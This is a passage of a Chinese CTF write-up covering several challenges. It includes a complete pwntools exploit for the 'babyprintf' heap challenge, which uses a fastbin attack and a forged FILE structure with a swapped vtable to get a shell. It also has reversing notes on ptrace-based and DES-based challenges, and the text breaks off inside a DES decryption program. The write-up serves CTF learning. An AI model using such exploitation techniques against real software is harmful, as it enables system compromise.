chunk&#xFF0C;&#x7136;&#x540E;&#x6709;&#x4E86;&#x7B2C;&#x4E00;&#x4E2A;&#x5C31;&#x80FD;&#x6709;&#x7B2C;&#x4E8C;&#x4E2A;&#xFF0C;&#x4E0D;&#x65AD;&#x7533;&#x8BF7;&#x5185;&#x5B58;&#x6216;&#x8005;&#x8986;&#x76D6;top chunk&#x7684;size&#x53EF;&#x4EE5;&#x5F88;&#x8F7B;&#x6613;&#x7684;&#x505A;&#x5230;&#x8FD9;&#x70B9;&#x3002;&#x540C;&#x65F6;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53E6;&#x4E0B;&#x9762;&#x90A3;&#x4E2A;&#x7684;size&#x4E3A;0x41&#xFF0C;&#x4E4B;&#x540E;&#x7533;&#x8BF7;&#x4E0A;&#x9762;&#x90A3;&#x4E2A;&#x5806;&#x5757;&#x5C31;&#x80FD;&#x628A;&#x4E0B;&#x9762;&#x8FD9;&#x4E2A;fastbin&#x8986;&#x76D6;&#x4E86;&#x3002;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;0x41&#x7684;fastbin attack, &#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8986;&#x76D6;&#x5230;&#x4F4D;&#x4E8E;data&#x6BB5;&#x4E0A;&#x7684;stdout&#x6307;&#x9488;&#xFF0C;&#x5177;&#x4F53;&#x5982;&#x4E0B;</p> <pre><code>    <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>            <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>
      freed chunk1                       alloced
    <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>            <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>
          dummy            <span class="token operator">-</span><span class="token operator">&gt;</span>                overflow
    <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>            <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>
      freed chunk2<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span>               chunk2<span class="token operator">-</span><span class="token operator">&gt;</span>fd<span class="token operator">=</span>target
    <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>            <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span></code></pre><p>&#x5F53;&#x7136;libc&#x4E2D;&#x662F;&#x5B58;&#x5728;onegadget&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x4E5F;&#x6709;&#x4EBA;&#x76F4;&#x63A5;&#x53BB;&#x8986;&#x76D6;malloc_hook&#xFF0C;&#x8FD9;&#x4E9B;&#x90FD;&#x53EF;&#x4EE5;<br>&#x7136;&#x540E;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x86CB;&#x75BC;&#x7684;&#x662F;libc-2.24&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x56E0;&#x5B83;&#x4E3A;&#x52A0;&#x5165;&#x4E86;&#x65B0;&#x7684;&#x5BF9;vtable&#x7684;&#x68C0;&#x9A8C;&#x673A;&#x5236;&#x3002;&#x5982;&#x4F55;&#x7ED5;&#x8FC7;&#x5462;&#xFF1F;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x5F88;&#x591A;&#xFF0C;&#x53EA;&#x8981;&#x8BB0;&#x5F97;&#x4E00;&#x70B9;&#xFF0C;&#x6211;&#x4EEC;&#x5DF2;&#x7ECF;&#x80FD;&#x63A7;&#x5236;&#x201C;&#x6574;&#x4E2A;&#x201C;FILE&#x7ED3;&#x6784;&#x4F53;&#xFF0C;&#x8FD9;&#x70B9;&#x5982;&#x679C;&#x7A0D;&#x5FAE;&#x53BB;&#x770B;&#x4E0B;&#x6E90;&#x7801;&#x7684;&#x8BDD;&#x5E94;&#x8BE5;&#x80FD;&#x627E;&#x5230;&#x5F88;&#x591A;&#x65B9;&#x6CD5;&#xFF0C;&#x8FD9;&#x91CC;&#x63D0;&#x4F9B;&#x4E00;&#x4E2A;&#x66FF;&#x6362;vtable( _IO_file_jumps)&#x5230;&#x53E6;&#x4E00;&#x4E2A;vtable( _IO_str_jumps), &#x5229;&#x7528;&#x4E24;&#x4E2A;vtable defalut&#x65B9;&#x6CD5;&#x7684;&#x4E0D;&#x540C;&#x62FF;&#x5230;shell&#x7684;&#x89E3;&#x9898;&#x811A;&#x672C;(&#x504F;&#x79FB;&#x8BF7;&#x81EA;&#x884C;&#x66F4;&#x6539;)&#xFF1A;</p> <pre><code>    from pwn import <span class="token operator">*</span>
    context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">&apos;debug&apos;</span>

    <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">pr</span></span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&apos;result: &apos;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&apos;size: &apos;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">]</span>

    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">&apos;./babyprintf&apos;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&apos;size: &apos;</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        pr<span class="token punctuation">(</span><span class="token number">0xff0</span><span class="token punctuation">,</span><span class="token string">&apos;a&apos;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&apos;0xe00&apos;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&apos;%llx&apos;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&apos;result: &apos;</span><span class="token punctuation">)</span>
    libc_addr <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token string">&apos;0x&apos;</span><span class="token operator">+</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c6780</span>
    print <span class="token string">&apos;libc: &apos;</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>libc_addr<span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&apos;size: &apos;</span><span class="token punctuation">)</span>
    pr<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">&apos;a&apos;</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x1d1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    pr<span class="token punctuation">(</span><span class="token number">0x1d0</span><span class="token punctuation">,</span><span class="token string">&apos;1&apos;</span><span class="token punctuation">)</span>
    pr<span class="token punctuation">(</span><span class="token number">0x130</span><span class="token punctuation">,</span><span class="token string">&apos;1&apos;</span><span class="token punctuation">)</span>
    pr<span class="token punctuation">(</span><span class="token number">0xd00</span><span class="token punctuation">,</span><span class="token string">&apos;1&apos;</span><span class="token punctuation">)</span>
    pr<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token string">&apos;a&apos;</span><span class="token operator">*</span><span class="token number">0xa8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x61</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    pr<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token string">&apos;a&apos;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&apos;0x60&apos;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&apos;string: &apos;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&apos;\x00&apos;</span><span class="token operator">*</span><span class="token number">0x2028</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x601062</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
    pr<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">&apos;a&apos;</span><span class="token punctuation">)</span>

    system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> <span class="token number">0x45390</span>
    sh_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> <span class="token number">0x18cd17</span>
    malloc_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> <span class="token number">0x84130</span>
    vtable_addr <span class="token operator">=</span> libc_addr<span class="token operator">+</span><span class="token number">0x3c37a0</span>

    flag<span class="token operator">=</span><span class="token number">2</span><span class="token operator">|</span><span class="token number">0x8000</span>
    fake_stream <span class="token operator">=</span> p64<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    fake_stream <span class="token operator">+</span><span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>
    fake_stream <span class="token operator">+</span><span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    fake_stream <span class="token operator">+</span><span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x7fffffffffffffff</span><span class="token punctuation">)</span>
    fake_stream <span class="token operator">=</span> fake_stream<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">&apos;\x00&apos;</span><span class="token punctuation">)</span>
    fake_stream <span class="token operator">+</span><span class="token operator">=</span> p64<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span>
    fake_stream <span class="token operator">+</span><span class="token operator">=</span> p64<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span>
    fake_stream <span class="token operator">=</span> fake_stream<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token string">&apos;\x00&apos;</span><span class="token punctuation">)</span>
    fake_stream <span class="token operator">+</span><span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span>
    fake_stream <span class="token operator">=</span> fake_stream<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xd8</span><span class="token punctuation">,</span><span class="token string">&apos;\x00&apos;</span><span class="token punctuation">)</span>
    fake_stream <span class="token operator">+</span><span class="token operator">=</span> p64<span class="token punctuation">(</span>vtable_addr<span class="token punctuation">)</span>
    fake_stream <span class="token operator">+</span><span class="token operator">=</span> p64<span class="token punctuation">(</span>malloc_addr<span class="token punctuation">)</span> <span class="token comment">#alloc</span>
    fake_stream <span class="token operator">+</span><span class="token operator">=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token comment">#hook free</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&apos;0x30&apos;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&apos;a&apos;</span><span class="token operator">*</span><span class="token number">14</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x601090</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>fake_stream<span class="token punctuation">)</span>

    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="aruok">ar_u_ok</h3> <p>&#x4E3B;&#x8981;&#x8003;&#x5BDF;&#x5BF9;ptrace&#x7684;&#x8BA4;&#x8BC6;&#x548C;rc6,rc4&#x7684;&#x8BC6;&#x522B;</p> <h4 id="&#x52A0;&#x5BC6;&#x89E3;&#x5BC6;">&#x52A0;&#x5BC6;&#x89E3;&#x5BC6;</h4> <p>&#x771F;&#x6B63;&#x7684;&#x52A0;&#x5BC6;&#x548C;&#x89E3;&#x5BC6;&#x8FC7;&#x7A0B;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x6807;&#x51C6;&#x7684;rc6&#xFF0C;&#x53EA;&#x8981;&#x628A;&#x51FD;&#x6570;&#x4E2D;&#x7684;&#x90A3;&#x4E2A;int&#x5E38;&#x91CF;&#x653E;&#x5230;google&#x91CC;&#x641C;&#x7D22;&#x4E00;&#x4E0B;&#x5C31;&#x77E5;&#x9053;&#x662F;rc6&#x52A0;&#x5BC6;&#xFF08;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x4EE3;&#x7801;&#x88AB;rc4&#x52A0;&#x5BC6;&#x4E86;&#xFF0C;&#x4E0D;&#x4E0D;&#x89E3;&#x5BC6;&#x662F;&#x770B;&#x4E0D;&#x5230;&#x7684;&#xFF09;&#x3002;</p> <p>rc6&#x52A0;&#x5BC6;&#x548C;&#x89E3;&#x5BC6;&#x7684;&#x4EE3;&#x7801;&#x89C1;&#x6E90;&#x7801;</p> <h4 id="&#x7A0B;&#x5E8F;&#x6D41;&#x7A0B;">&#x7A0B;&#x5E8F;&#x6D41;&#x7A0B;</h4> <p>&#x7A0B;&#x5E8F;&#x9996;&#x5148;&#x5224;&#x65AD;&#x542F;&#x52A8;&#x53C2;&#x6570;&#xFF0C;&#x5982;&#x679C;argc&#x4E3A;1&#xFF0C;&#x5219;&#x4EE5;debugger&#x8EAB;&#x4EFD;&#x542F;&#x52A8;&#xFF0C;&#x5229;&#x7528;fork&#x5206;&#x51FA;parent&#x548C;child&#x3002;parent&#x4F5C;&#x4E3A;&#x771F;&#x6B63;&#x7684;debugger&#xFF0C;child&#x5229;&#x7528;execve&#x6765;&#x542F;&#x52A8;&#x81EA;&#x8EAB;&#x5E76;&#x4EE5;&#x7236;&#x8FDB;&#x7A0B;&#x7684;pid&#x4F5C;&#x4E3A;&#x542F;&#x52A8;&#x53C2;&#x6570;&#x3002;</p> <p>&#x5982;&#x679C;argc&#x4E3A;2&#xFF0C;&#x8BF4;&#x660E;&#x662F;debuggee&#x3002;&#x7A0B;&#x5E8F;&#x5229;&#x7528;puts&#x6253;&#x5370;<code>plz_input_flag</code>&#xFF0C;&#x4F46;&#x662F;write&#x7684;syscall&#x88AB;ptrace hook&#x4E86;&#x3002;puts&#x7684;&#x539F;&#x59CB;&#x5185;&#x5BB9;&#x662F;&#x4E71;&#x7801;&#xFF0C;&#x9700;&#x8981;debugger&#x5BF9;&#x5176;&#x8FDB;&#x884C;&#x89E3;&#x5BC6;&#x3002;</p> <p>&#x7136;&#x540E;&#x662F;&#x5229;&#x7528;scanf&#x6765;&#x63A5;&#x6536;flag&#x3002;&#x9ED8;&#x8BA4;&#x662F;&#x5141;&#x8BB8;&#x8F93;&#x5165;<code><span class="token operator">%</span><span class="token number">48</span>s</code>&#x4F46;&#x662F;&#x8FD9;&#x91CC;ptrace hook&#x4E86;read syscall&#xFF0C;&#x68C0;&#x6D4B;read syscall&#x89E6;&#x53D1;&#x7684;&#x6B21;&#x6570;&#xFF08;&#x5728;&#x7A0B;&#x5E8F;&#x5F00;&#x5934;&#x5229;&#x7528;setbuf&#x5C06;stdin&#x548C;stdout&#x7684;&#x7F13;&#x51B2;&#x8C03;&#x6574;&#x4E3A;0&#xFF09;,&#x4ECE;&#x800C;&#x4F7F;flag&#x7684;&#x771F;&#x5B9E;&#x6700;&#x5927;&#x957F;&#x5EA6;&#x4E3A;32&#x3002;</p> <p>&#x63A5;&#x7740;&#x662F;&#x4E00;&#x6BB5;&#x5224;&#x65AD;&#x662F;&#x5426;&#x8C03;&#x8BD5;&#x8005;&#x4E3A;&#x7236;&#x8FDB;&#x7A0B;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x6CA1;&#x95EE;&#x9898;&#x7684;&#x8BDD;&#x4F1A;&#x8C03;&#x7528;fclose&#x6765;&#x5173;&#x95ED;&#x4E4B;&#x524D;&#x6253;&#x5F00;&#x7684;&#x6587;&#x4EF6;&#x3002;&#x6B64;&#x5904;&#x7528;ptrace hook&#x4E86;close syscall&#x3002;&#x4F46;&#x662F;&#x5728;&#x7A0B;&#x5E8F;&#x8FD0;&#x884C;&#x524D;&#x4E5F;&#x4F1A;&#x8C03;&#x7528;close syscall&#x3002;&#x8FD9;&#x91CC;&#x5229;&#x7528;&#x8BBE;&#x7F6E;&#x53D8;&#x91CF;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x4F7F;&#x5F97;&#x5728;&#x7B2C;&#x4E8C;&#x6B21;close&#x7684;&#x65F6;&#x5019;&#x89E6;&#x53D1;&#x3002;</p> <p>&#x89E6;&#x53D1;&#x65F6;&#x6267;&#x884C;&#x7684;&#x4EE3;&#x7801;&#x662F;&#x5229;&#x7528;rc4&#x5C06;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#x89E3;&#x5BC6;&#xFF0C;&#x7136;&#x540E;patch&#x4EE3;&#x7801;&#x4E3A;<code><span class="token number">0xcc</span></code>&#x4F7F;&#x7A0B;&#x5E8F;&#x505C;&#x5728;&#x68C0;&#x6D4B;trace&#x4EE3;&#x7801;&#x7684;&#x4E0B;&#x4E00;&#x884C;&#xFF0C;&#x5728;&#x5C06;&#x5176;patch&#x6210;jmp&#x5230;data&#x6BB5;&#x7684;&#x90A3;&#x6BB5;&#x552F;&#x4E00;&#x53EF;&#x89C6;&#x7684;&#x96F7;&#x519B;ascii&#x5B57;&#x7B26;&#x5904;&#xFF0C;&#x5E76;&#x5C06;flag&#x4F20;&#x9012;&#x7ED9;rdx&#xFF0C;&#x63A5;&#x7740;&#x7EE7;&#x7EED;&#x6267;&#x884C;&#x3002;&#x96F7;&#x519B;&#x90A3;&#x6BB5;ascii&#x5176;&#x5B9E;&#x662F;&#x4EE3;&#x7801;&#x3002;&#x524D;&#x9762;&#x7684;<code><span class="token number">52</span>Mi<span class="token operator">!</span></code>&#x662F;<code>xor eax<span class="token punctuation">,</span> <span class="token number">0x21694d32</span></code>&#xFF0C;&#x4ECE;&#x800C;&#x4F7F;&#x540E;&#x9762;&#x7684;jne&#x5168;&#x90E8;&#x6210;&#x7ACB;&#xFF0C;<code><span class="token constant">R_</span></code>&#x662F;<code>push rdx<span class="token punctuation">;</span>pop rdi</code>&#xFF0C;&#x4ECE;&#x800C;&#x5C06;&#x4E4B;&#x524D;&#x5728;rdx&#x4E2D;&#x7684;flag&#x4F20;&#x9012;&#x5230;rdi&#x4E2D;&#x3002;&#x5229;&#x7528;<code>u_</code>&#x8FD9;&#x4E2A;jne&#x8DF3;&#x8F6C;&#x8DF3;&#x8FC7;&#x4E2D;&#x95F4;&#x7684;&#x975E;&#x4EE3;&#x7801;&#x533A;&#xFF0C;&#x6700;&#x540E;jmp&#x5230;encrypt&#x51FD;&#x6570;&#x4E2D;&#x3002;</p> <p>encrypt&#x51FD;&#x6570;&#x5C31;&#x662F;&#x8C03;&#x7528;rc6&#x52A0;&#x5BC6;&#xFF0C;&#x5C06;32&#x4F4D;&#x7684;flag&#x5206;16&#x4F4D;&#x4E24;&#x6B21;&#x52A0;&#x5BC6;&#xFF0C;&#x6700;&#x540E;&#x548C;enc&#x7ED3;&#x679C;&#x6BD4;&#x8F83;&#x3002;</p> <p>&#x7531;&#x4E8E;&#x8C03;&#x7528;&#x4E86;&#x5F88;&#x591A;&#x7684;ptrace&#x6765;&#x5B9E;&#x73B0;smc&#x548C;hook&#xFF0C;&#x7EAF;&#x52A8;&#x6001;&#x5206;&#x6790;&#x5E94;&#x8BE5;&#x4E0D;&#x592A;&#x53EF;&#x80FD;&#x5B9E;&#x73B0;&#xFF0C;&#x9700;&#x8981;&#x9759;&#x6001;&#x5206;&#x6790;&#x540E;patch&#x7A0B;&#x5E8F;&#x624D;&#x80FD;&#x4F7F;&#x7528;&#x52A8;&#x6001;&#x5206;&#x6790;&#x3002;</p> <p>&#x5B8C;&#x6574;&#x7A0B;&#x5E8F;&#x89C1;github&#xFF0C;&#x7531;&#x4E8E;&#x6709;smc&#x90E8;&#x5206;&#xFF0C;&#x53EF;&#x80FD;&#x5728;&#x4E0D;&#x540C;&#x673A;&#x5B50;&#x4E0A;&#x7F16;&#x8BD1;&#x7ED3;&#x679C;&#x4E0D;&#x6B63;&#x786E;&#xFF0C;&#x6240;&#x4EE5;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x4E2A;&#x6D4B;&#x8BD5;&#x7528;&#x7684;binary&#x3002;</p> <h3 id="ippatsu-nyuukon">ippatsu-nyuukon</h3> <h4 id="0x00-&#x5199;&#x5728;&#x524D;&#x9762;">0x00 &#x5199;&#x5728;&#x524D;&#x9762;</h4> <p>&#x3000;&#x8BBE;&#x8BA1;&#x601D;&#x8DEF;&#xFF1A;<br>&#x3000;&#x5E94;&#x7528;&#x5C42;&#x4E0E;&#x9A71;&#x52A8;&#x5C42;&#x901A;&#x4FE1;&#xFF0C;&#x5728;&#x9A71;&#x52A8;&#x5C42;&#x52A0;&#x5BC6;&#x7531;&#x5E94;&#x7528;&#x5C42;&#x53D1;&#x9001;&#x8FC7;&#x6765;&#x7684;&#x660E;&#x6587;&#x540E;&#x6BD4;&#x8F83;flag&#xFF0C;&#x5E76;&#x8F93;&#x51FA;&#x7ED3;&#x679C;<br>&#x3000;<br>&#x3000;&#x90E8;&#x5206;&#x7EC6;&#x8282;&#xFF1A;</p> <blockquote> <ul> <li>&#x9A71;&#x52A8;&#x5C42;&#x7684;&#x5206;&#x53D1;&#x51FD;&#x6570;&#x5206;&#x4E3A;2&#x90E8;&#x5206;&#xFF0C;SEND&#x548C;RECV&#xFF1B;<br>SEND&#xFF1A;&#x63A5;&#x53D7;&#x4ECE;&#x5E94;&#x7528;&#x5C42;&#x53D1;&#x6765;&#x7684;&#x660E;&#x6587;&#x5E76;&#x52A0;&#x5BC6;&#xFF0C;&#x5176;&#x672C;&#x4F53;&#x662F;DES<br>RECV&#xFF1A;&#x6BD4;&#x8F83;&#x52A0;&#x5BC6;&#x540E;&#x7684;&#x660E;&#x6587;&#x548C;&#x52A0;&#x5BC6;flag</li> <li>&#x9A71;&#x52A8;&#x5C42;&#x63A5;&#x53D7;&#x7684;&#x660E;&#x6587;&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;&#x53EA;&#x6709;&#x7B2C;&#x4E00;&#x6B21;&#x52A0;&#x5BC6;&#x7ED3;&#x679C;&#x662F;&#x6B63;&#x786E;&#x7684;</li> <li>DES&#x540E;&#x5C06;&#x4E0D;&#x53EF;&#x89C6;&#x6570;&#x636E;&#x8F6C;&#x4E3A;hex</li> <li>&#x52A0;&#x5BC6;&#x6570;&#x636E;&#x4E0E;&#x52A0;&#x5BC6;flag&#x6BD4;&#x8F83;&#x524D;&#x5148;&#x5F02;&#x6216;&#x540C;&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x5B57;&#x8282;</li> </ul> </blockquote> <h4 id="0x01-wp">0x01 wp</h4> <p> <a href="http://img.blog.csdn.net/20171113115209604"target="_blank"class="fancybox"rel="grouped"title=""> <img alt=""class="img-responsive lazy"data-original="http://img.blog.csdn.net/20171113115209604"height="100%"src="https://www.ctfwp.com/gitbook/gitbook-plugin-lazyload/loading.gif"> </a><br>&#x8DDF;&#x5230;&#x5206;&#x53D1;&#x51FD;&#x6570;&#x7684;SEND, &#x5B9A;&#x4F4D;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;<br>&#x56E0;&#x4E3A;DES&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;&#xFF0C;&#x6240;&#x4EE5;&#x4ECE;ida&#x4E2D;&#x62A0;&#x51FA;&#x6765;&#xFF0C;&#x4FEE;&#x6539;&#x5C0F;&#x90E8;&#x5206;&#x5E76;&#x6DFB;&#x52A0;&#x5BC6;&#x6587;+key&#x5C31;&#x53EF;&#x4EE5;&#x8DD1;&#x89E3;&#x5BC6;&#x811A;&#x672C;&#x4E86;</p> <pre><code class="lang-`">    <span class="token operator">/</span><span class="token operator">/</span> desrypt_des<span class="token punctuation">.</span>cpp
    <span class="token comment">#include &lt;stdio.h&gt;    </span>
    <span class="token comment">#include &lt;string.h&gt;    </span>

    <span class="token comment">#define maxn 0x8000     // &#x7406;&#x8BBA;&#x652F;&#x6301;&#x660E;&#x6587;&#x957F;&#x5EA6;</span>
    <span class="token operator">/</span><span class="token operator">/</span><span class="token comment">#define ENCODE 0,16,1       // &#x52A0;&#x5BC6;&#x7528;&#x7684;&#x5B8F;</span>
    <span class="token comment">#define DECODE 15,-1,-1     // &#x89E3;&#x5BC6;&#x7528;&#x7684;&#x5B8F;    </span>

    <span class="token operator">/</span><span class="token operator">/</span> &#x660E;&#x6587;&#x521D;&#x59CB;&#x7F6E;&#x6362;    
    char msg_ch<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span>
        <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span>
        <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span>
